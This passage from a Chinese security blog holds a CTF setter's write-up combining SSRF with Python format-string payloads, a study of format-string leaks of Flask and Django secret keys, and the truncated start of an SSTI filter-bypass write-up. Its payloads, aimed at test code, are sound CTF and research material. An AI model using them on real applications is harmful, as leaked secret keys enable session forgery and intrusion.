class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i'</span>,$url))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Don\'t use strange protocol!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    $funcname = $head.<span class="string">'curl_init'</span>; </span><br><span class="line"></span><br><span class="line">    $ch = $funcname(); </span><br><span class="line">    <span class="keyword">if</span>($ch)&#123; </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        curl_close($ch); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        $output = <span class="string">'rua'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>由于这题的主要考点在python端，所以我在php端的考点就相对随意了一点，主要是几个trick。在head的选取上，考的就是P神在code-breaking里考过的小trick，反斜杠加在函数名前边可以正常执行，原因是被视为命名空间。而在ssrf的内容外带上，利用extract的变量覆盖可以将预设的$begin的内容改变为%s%，这样sprintf的第一个参数就变为了%s%%d。在php的格式化字符串里%%被视作一个%字符，而前边的%s就可以获取$output的内容，接下来就是利用php的ssrf打本机python的api。</p>
<p>简单扫描本机端口发现<a href="http://127.0.0.1:8080有回显" target="_blank" rel="noopener">http://127.0.0.1:8080有回显</a></p>
<blockquote>
<p>Welcome to our FMKQ api, you could use the help information below To read file: /read/file=example&amp;vipcode=example if you are not vip,let vipcode=0,and you can only read /tmp/{file} Other functions only for the vip!!! </p>
</blockquote>
<p>这里我放了一个提示{file}，就是提示python格式化字符串{}里的参数是file。由于非vip无法读取/tmp目录以外的东西，所以要先获得vipcode。先看看file参数对应的对象有什么属性：</p>
<p><code>head=\&amp;begin=%s%&amp;url=http://127.0.0.1:8080/read/file%3d{file.__dict__}%26vipcode%3d0</code></p>
<p>可以看到该对象的属性里存在一个vip对象，用如下payload查看vip这个对象有什么属性：</p>
<p><code>head=\&amp;begin=%s%&amp;url=http://127.0.0.1:8080/read/file%3d{file.vip.__dict__}%26vipcode%3d0</code></p>
<p>可以直接看到truevipcode这个属性和它的值。有了vipcode以后就可以尝试读文件：</p>
<p><code>head=\&amp;begin=%s%&amp;url=http://127.0.0.1:8080/read/file%3dapp.py%26vipcode%3dnQ0ErTMlJHZ8DVpGcAyaIWuvXqhmBC3Ob5kji62tzFdYxw71</code></p>
<p>再根据app.py的模块包含关系读其他的文件。可以发现在vip读文件时会列出当前目录的其他文件，我们只需要读/xxx就可以看到根目录下flag文件所在目录，然而可以在代码里看到fl4g被ban了。重新审计vipreadfile的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file) <span class="comment"># vulnerability</span></span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>当前目录文件被保存在一个全局变量里，而filepath赋值这里依然存在一个格式化字符串漏洞。根据代码可知，文件的绝对路径会被保存到self.path中，并且会在格式化字符串时与文件名拼接。而格式化后的字符串作为被读取的文件。所以我们只需要通过格式化字符串漏洞来获取全局变量里的文件名来绕过对fl4g的检测即可。读取一个/xxx来把这个全局变量赋值为根目录的文件，再读取<code>/{vipfile.__class__.__init__.__globals__[current_folder_file][21]}/flag</code>来获取flag的内容。至于为什么这个payload可以获取全局变量，我之前的博客里有写。</p>
<h2 id="非预期-amp-amp-一些问题"><a href="#非预期-amp-amp-一些问题" class="headerlink" title="非预期&amp;&amp;一些问题"></a>非预期&amp;&amp;一些问题</h2><h3 id="非预期1-读apache-log"><a href="#非预期1-读apache-log" class="headerlink" title="非预期1 读apache log"></a>非预期1 读apache log</h3><p>比赛前测试的时候想到可能会有人读apache的log来非预期，所以我临时在php端加了一个log的正则，然而这个正则可以通过二次url编码来绕过的，后来想了想应该加在python端。而且部分师傅在比赛时遇到了随机生成的vipcode里出现了log字符串的问题导致无法正常做题，出题人在这里谢罪了。虽然也可以二次url编码vipcode来绕过，但是我也不能明说，否则有可能都去读apache log了。</p>
<h3 id="非预期2-字符串截取"><a href="#非预期2-字符串截取" class="headerlink" title="非预期2 字符串截取"></a>非预期2 字符串截取</h3><p>Nu1L的做法：</p>
<p><img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E8%B5%9Bfmkq%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/1.png" alt></p>
<p>确实没想到这个，过滤的内容与flag这四个字母不相同可以避免这个非预期</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/">Python格式化字符串研究</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-29</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Python-CTF/">Python CTF</a></span><div class="content"><h4 id="本文首发于合天智汇https-mp-weixin-qq-com-s-Ww1QviZyYxnNbIil-0BW2Q"><a href="#本文首发于合天智汇https-mp-weixin-qq-com-s-Ww1QviZyYxnNbIil-0BW2Q" class="headerlink" title="本文首发于合天智汇https://mp.weixin.qq.com/s/Ww1QviZyYxnNbIil_0BW2Q"></a>本文首发于合天智汇<a href="https://mp.weixin.qq.com/s/Ww1QviZyYxnNbIil_0BW2Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Ww1QviZyYxnNbIil_0BW2Q</a></h4><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天与队友交流时提及python的格式化字符串漏洞，这个漏洞之前接触不多，所以写篇文章从基础部分仔细研究了研究。python环境是python3.7。</p>
<h2 id="Python3里的格式化字符串"><a href="#Python3里的格式化字符串" class="headerlink" title="Python3里的格式化字符串"></a>Python3里的格式化字符串</h2><p>python3中的格式化字符串主要有以下两种形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"test %s"</span> % (<span class="string">'test'</span>)</span><br><span class="line"><span class="string">"test &#123;0&#125;"</span>.format(<span class="string">'test'</span>)</span><br></pre></td></tr></table></figure>

<p>这两个语句的输出都是test test。虽然效果一样，但是在python web的开发中一般认为前者比后者要安全，因为后者可能会因为自身支持的一些特殊用法导致配置信息等的泄露。</p>
<p>首先，format形式的格式化字符串基本用法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"I am &#123;1&#125;,he is &#123;0&#125;"</span>.format(<span class="string">"a"</span>,<span class="string">"b"</span>)</span><br></pre></td></tr></table></figure>

<p>这个语句的输出是<code>I am b,he is a</code>，大括号{}中的数字代表了format的变量顺序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;I am &#123;MyName&#125;,he is &#123;HisName&#125;&quot;.format(MyName=&quot;aa&quot;,HisName=&quot;bb&quot;)</span><br></pre></td></tr></table></figure>

<p>这个语句的输出是<code>I am aa,he is bb</code>，这种语句可以在format函数的参数通过key来赋值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"I am &#123;&#125;,he is &#123;&#125;"</span>.format(<span class="string">"a"</span>,<span class="string">"b"</span>)</span><br></pre></td></tr></table></figure>

<p>这个语句的输出是<code>I am a,he is b</code>，这样的用法会让大括号与format的参数一一对应。</p>
<p>当大括号与format的参数不能一一对应的时候便会报错，例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"I am &#123;0&#125;,he is also &#123;0&#125;"</span>.format(<span class="string">'a'</span>)</span><br><span class="line"><span class="string">"I am &#123;0&#125;,he is also &#123;1&#125;"</span>.format(<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>

<p>前者会输出<code>I am a,he is also a</code>，而后者会报错<code>tuple index out of range</code>。</p>
<p>这些format函数的基本用法并不是导致格式化字符串漏洞的根源，查看下列代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"first &#123;0[1]&#125;, second &#123;0&#125;"</span>.format([<span class="string">'a'</span>,<span class="string">'b'</span>])</span><br></pre></td></tr></table></figure>

<p>输出为<code>first b, second [&#39;a&#39;, &#39;b&#39;]</code>，可见当format函数的参数是一个列表时，可以通过用方括号添加索引的方式来获取列表的值。同样的，这种用法也可以用在类的属性上，比如以下代码会输出字符串a的内置属性__class__:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"&#123;0.__class__&#125;"</span>.format(<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure>

<p>输出结果是<code>&lt;class &#39;str&#39;&gt;</code></p>
<h2 id="一般利用"><a href="#一般利用" class="headerlink" title="一般利用"></a>一般利用</h2><p>python的格式化字符串的利用与沙盒逃逸或者python SSTI很相似，但format与后两者的区别在于它只能读取属性而不能执行方法，这就限制了格式化字符串的利用与攻击链的构造。举个例子，python SSTI中可以通过<code>&#39;a&#39;.__class__.__base__.__subclasses__()[12]</code>来获取任意类，但是由于format函数无法执行__subclasses__()这样的方法，直接把这种payload套进格式化字符串的利用中会报错<code>type object &#39;object&#39; has no attribute &#39;__subclasses__()&#39;</code>。</p>
<p>在与队友讨论时我们用的测试代码简化如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret.secret <span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppendStr</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, message = <span class="string">'test'</span>)</span>:</span></span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    s = input(<span class="string">"test\n"</span>)</span><br><span class="line">    t = s + <span class="string">" by the way &#123;0&#125;"</span></span><br><span class="line">    print(t.format(AppendStr()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>

<p>可以看到这里format函数的参数是一个对象的实例，而secret保存在全局变量中。熟悉SSTI或者沙箱绕过的都知道，python的函数类有一个内置属性__globals__可以以字典的形式返回函数所在的全局命名空间所定义的全局变量。结合format函数的格式化字符串可以读取成员属性的特性，我们很容易知道只需通过一个调用链来获取一个函数类并读取它的__globals_<em>属性即可。这里我们可以使用这样的payload：`{0.<em>_class</em></em>.<strong>init</strong>.<strong>globals</strong>}<code>。由于AppendStr类定义了\_\_init\_\_函数，所以可以通过</code>{0.<strong>class</strong>.<strong>init</strong>}<code>来获取一个函数类</code>&lt;function AppendStr.<strong>init</strong> at 0x0000019C611D2730&gt;`，再读取这个类的__globals__属性来获取secret。这个思路也适用于一切的类的成员函数，假如把测试代码改为如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    s = input(<span class="string">"test\n"</span>)</span><br><span class="line">    t = s + <span class="string">" by the way &#123;0&#125;"</span></span><br><span class="line">    print(t.format(<span class="string">'test'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>

<p>如果机械地套用上边的payload会报错<code>&#39;wrapper_descriptor&#39; object has no attribute &#39;__globals__&#39;</code>。可以通过以下代码来查看字符串类的成员属性：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'a'</span>.__class__.__dict__)</span><br></pre></td></tr></table></figure>

<p>输出很多这里就不一一列举了。可以在输出的结果中看到字符串类并没有function类型的成员属性，所以不能通过格式化字符串来获得全局变量。</p>
<h2 id="Flask下读取secret-key"><a href="#Flask下读取secret-key" class="headerlink" title="Flask下读取secret_key"></a>Flask下读取secret_key</h2><p>把情景切换到flask下写出如下的测试代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'gasidfjbodnjgfnof'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppendStr</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, message = <span class="string">'test'</span>)</span>:</span></span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    template = <span class="string">'Hello &#123;0&#125;, This is your email: '</span> + request.args.get(<span class="string">'email'</span>)</span><br><span class="line">    <span class="keyword">return</span> template.format(AppendStr())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>, <span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>前置步骤与之前讲的相似，get方法提交参数<code>?email={0.__class__.__init__.__globals__}</code>可以看到当前的全局变量，然而secret_key并不会出现在返回中。我本地测试时返回的是这些数据：</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/5.png" alt></p>
<p>似乎不能简单粗暴地通过这个payload来获取secret_key，我们再看看flask的代码app.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 部分包及代码省略</span></span><br><span class="line"><span class="keyword">from</span> .config <span class="keyword">import</span> Config, ConfigAttribute</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flask</span><span class="params">(_PackageBoundObject)</span>:</span></span><br><span class="line"><span class="comment"># 注释省略</span></span><br><span class="line">	config_class = Config</span><br><span class="line">	</span><br><span class="line">	testing = ConfigAttribute(<span class="string">'TESTING'</span>)</span><br><span class="line">	</span><br><span class="line">    secret_key = ConfigAttribute(<span class="string">'SECRET_KEY'</span>)</span><br><span class="line">    </span><br><span class="line">    session_cookie_name = ConfigAttribute(<span class="string">'SESSION_COOKIE_NAME'</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到Flask类的属性secret_key会保存当前的secret_key的值，而上边返回的全局变量里有<code>&#39;app&#39;: &lt;Flask &#39;template&#39;&gt;</code>。我这个文件名是template，这就是当前的Flask类实例化的对象。所以只需要在上边那个payload后补充一些东西就能拿到secret_key，其内容如下：<code>?email={0.__class__.__init__.__globals__[app].secret_key}</code>。</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/6.png" alt></p>
<h2 id="django下读取SECRET-KEY"><a href="#django下读取SECRET-KEY" class="headerlink" title="django下读取SECRET_KEY"></a>django下读取SECRET_KEY</h2><p>p师傅很早以前写过一篇文章讲解过这个利用方法，其链接如下：<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html。p师傅在文章中给出了两个payload，但并没有仔细讲解其原理。所以我这里就逐步分析下其中一个payload的构造，另一个payload思路类似。测试代码如下：" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html。p师傅在文章中给出了两个payload，但并没有仔细讲解其原理。所以我这里就逐步分析下其中一个payload的构造，另一个payload思路类似。测试代码如下：</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    template = <span class="string">'Hello &#123;user&#125;, This is your email: '</span> + request.GET.get(<span class="string">'email'</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>

<p>在未登录状态下，request.user是类AnonymousUser的实例化对象，类定义在django/contrib/auth/models.py文件中395行：</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/1.png" alt></p>
<p>402行看到该对象的_groups属性是一个EmptyManager类的对象。429行可知该对象的groups方法也被转化为了名为groups且值与_groups相同的类属性。EmptyManager类定义在django/db/models/manager.py的195行</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/2.png" alt></p>
<p>可以看到这个对象的model属性是与AnonymousUser类定义在同一个文件中的Group类，在django/contrib/auth/models.py文件中91行：</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/3.png" alt></p>
<p>Group类本身定义的东西没什么好看的，一路跟随至其父类的父类ModelBase，定义在django/db/models/base.py的71行，有）：</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/4.png" alt></p>
<p>在121行可以看到该类的_meta属性是一个Options类实例化的对象。跟踪至django/db/models/options.py的65行可以看到类定义（此处由于代码太长不截图了）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.apps <span class="keyword">import</span> apps</span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Options</span>:</span></span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line">    default_apps = apps</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, meta, app_label=None)</span>:</span></span><br><span class="line">		self.app_label = app_label</span><br><span class="line">        self.apps = self.default_apps</span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">app_config</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># Don't go through get_app_config to avoid triggering imports.</span></span><br><span class="line">        <span class="keyword">return</span> self.apps.app_configs.get(self.app_label)</span><br><span class="line"><span class="comment"># 省略</span></span><br></pre></td></tr></table></figure>

<p>可以看到app_config方法被转化为了只读属性，而该属性返回<code>self.apps.app_configs.get(self.app_label)</code>。审计代码可以清楚得发现self.apps就是导入的apps模块，即一个module类的对象。跟踪至django/apps/registry.py，可以看到类Apps的定义里，即原文件13行有</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apps</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, installed_apps=<span class="params">()</span>)</span>:</span></span><br><span class="line">        self.app_configs = &#123;&#125;</span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">populate</span><span class="params">(self, installed_apps=None)</span>:</span></span><br><span class="line"><span class="comment"># 省略    </span></span><br><span class="line">            <span class="keyword">for</span> entry <span class="keyword">in</span> installed_apps:</span><br><span class="line">                <span class="keyword">if</span> isinstance(entry, AppConfig):</span><br><span class="line">                    app_config = entry</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app_config = AppConfig.create(entry) <span class="comment"># 91行</span></span><br><span class="line">                <span class="keyword">if</span> app_config.label <span class="keyword">in</span> self.app_configs:</span><br><span class="line">                    <span class="keyword">raise</span> ImproperlyConfigured(</span><br><span class="line">                        <span class="string">"Application labels aren't unique, "</span></span><br><span class="line">                        <span class="string">"duplicates: %s"</span> % app_config.label)</span><br><span class="line"></span><br><span class="line">                self.app_configs[app_config.label] = app_config <span class="comment"># 97行</span></span><br></pre></td></tr></table></figure>

<p>跟踪91行的AppConfig.create至django/apps/config.py，有：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span>:</span></span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(cls, entry)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            module = import_module(entry)</span><br></pre></td></tr></table></figure>

<p>这个Options类实例化的对象的app_config属性返回会返回一个对象，而这个对象的module属性是python的一个模块即module。而对于我的测试代码这种情景，module的内容为<code>&lt;module &#39;django.contrib.auth&#39; from &#39;C:\\python37\\lib\\site-packages\\django\\contrib\\auth\\__init__.py&#39;&gt;</code>。查看该模块的代码，可以在文件django/contrib/auth/admin.py中看到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="comment"># 省略</span></span><br></pre></td></tr></table></figure>

<p>settings模块里就有我们需要的SECRET_KEY。故我们可以通过简单的模块包含关系利用格式化字符串漏洞来读取SECRET_KEY，故最终payload如下：<code>[{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}]</code></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%88%98%E7%96%AB%E8%B5%9Bweb1%E9%A2%98%E8%A7%A3/">安恒杯战疫赛web1题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-26</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><p>就看了这一道题，简单记录下</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>提示了是Flask，猜测404页面存在SSTI，提交/1发现SSTI确实存在。简单fuzz后发现关键字过滤不多，就一个config，但是下划线_以及点号.都被过滤掉了，直接导致了__class__以及.read()这样的语句行不通。点号可以通过[“read”]()来代替.read()，而下划线的过滤参考这篇文章<a href="https://www.jianshu.com/p/a736e39c3510，用\x5f代替下划线（该写法不能用在python语句里）。所以可以用[&quot;\x5f\x5fclass\x5f\x5f&quot;]代替.\__class__。" target="_blank" rel="noopener">https://www.jianshu.com/p/a736e39c3510，用\x5f代替下划线（该写法不能用在python语句里）。所以可以用[&quot;\x5f\x5fclass\x5f\x5f&quot;]代替.\__class__。</a></p>
<p>用语句</p>
